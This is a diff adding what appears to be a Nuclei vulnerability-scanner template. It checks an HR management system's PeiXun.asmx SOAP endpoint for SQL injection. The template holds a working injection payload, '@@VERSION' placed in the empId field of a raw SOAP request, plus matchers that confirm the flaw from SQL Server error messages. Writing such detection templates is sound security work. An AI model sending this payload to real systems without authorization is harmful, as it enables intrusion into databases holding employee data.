@@ -1,0 +1,44 @@
+id: poc-yaml-tosharesoft-peixun-asmx-sqli
+info:
+  name: SameShare HR Management System TXEHR V15 PeiXun.asmx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /MobileService/PeiXun.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetPeiXunRecord"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetPeiXunRecord xmlns="http://tempuri.org/">
+              <company></company>
+              <empId>@@VERSION</empId>
+              <pageIndex>1</pageIndex>
+              <size>10</size>
+            </GetPeiXunRecord>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "Exception:"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
